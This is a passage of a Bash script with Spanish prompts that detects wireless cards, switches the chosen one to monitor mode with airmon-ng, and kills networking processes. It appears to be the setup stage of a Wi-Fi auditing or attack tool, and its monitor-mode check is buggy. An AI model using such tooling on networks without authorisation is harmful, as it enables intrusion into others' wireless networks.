iwconfig --version | grep "Recommend" | awk '{print $1}' > ./redes/iw.txt
airmon-ng | sed '3d' | awk '{print $2}' | sed '/^$/d' > ./redes/id.txt
cont=1
for j in `cat ./redes/iw.txt`
do 
      var=`nl ./redes/id.txt | grep $cont | awk '{print $2}'`
      echo $j"       "$var
      let cont=cont+1
done > ./redes/iwi.txt
declare -a tarj_disp
  for i in "tarj_disp";
    do
    count=1                
      if [ "$i" == "tarj_disp" ]; then
         while read -r line; do
           tarj_disp[${count}]="$line"
            count=$((count+1)) 
         done < <( cat ./redes/iwi.txt )
      fi
done

ntarj=$(echo ${#tarj_disp[@]})
if [ -z "${ntarj}" ];
  then
  echo -e ""$rojo" ERROR:"$verde" No se detectó ninguna tarjeta inalambrica"
  echo ""
  sleep 2
  exit
else
  echo ""
  echo -e ""$verde"  Se han detectado las siguientes interfaces :"
  echo ""
  echo -e $magenta" ════════════════════════════════════════════════════════════"
    for i in ${!tarj_disp[*]}; do
       echo -e $amarillo"          $i)        ${tarj_disp[${i}]}      "  
    done
    if [ $ntarj -ge 1 ]; then
     echo -e $magenta" ════════════════════════════════════════════════════════════"$azul""
     echo ""
     read -p " Selecciona una Interfaz: " opt
       while [[ $opt < 1 ]] || [[ $opt > $ntarj ]]; do
         echo ""
         echo -e $rojo" ERROR!"$verde"...Opcion Invalida"
         echo ""
         echo -e $magenta" ════════════════════════════════════════════════════════════"$azul""
         echo ""
       read -p " Selecciona una Interfaz: " opt
    done
   fi 
   
intrfaz=$(echo ${tarj_disp[${opt}]}) 
intrfz=`echo $intrfaz | awk '{print $1}'`
fi
}
####################################################Iniciar la tarjeta###############################################
START(){
ifconfig $intrfz down > /dev/null 2>&1
ifconfig $intrfz up > /dev/null 2>&1
iwconfig $intrfz rate 1M > /dev/null 2>&1
}
#################################################Poner en modo monitor################################################
MONITORUP(){ 
airmon-ng start $intrfz > /dev/null 2>&1
ifconfig mon0 > /dev/null 2>&1
echo ""
echo -e $magenta" ════════════════════════════════════════════════════════════"
echo -e $verde"           Activando "$amarillo""$intrfz""$verde" en modo monitor"
echo -e $magenta" ════════════════════════════════════════════════════════════"
echo ""
sleep 2
if [ $? = 0 ]; then
intmon=mon0
else
intmon=$intrfz
fi
}
###################################################Desactivar el modo monitor########################################
MONSTOP(){
intmons=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
let cuantas=`echo $intmons | wc -w`
let CONT=1
while [ $CONT -le $cuantas ]; do
MON=`echo $intmons| awk '{print $'$CONT'}'`
airmon-ng stop $MON > /dev/null 2>&1
let CONT=$CONT+1
done
}
#################################################Matar los procesos###################################################
KILL(){
pids=`ps -A | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc`
while [ "$pids" != "" ]; do
killall -q xterm ifconfig dhcpcd dhclient dhclient3 NetworkManager wpa_supplicant udhcpc > /dev/null 2>&1
pids=`ps -A | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc`
done
MONSTOP
rm -fr ./redes > /dev/null 2>&1
mkdir redes > /dev/null 2>&1
}

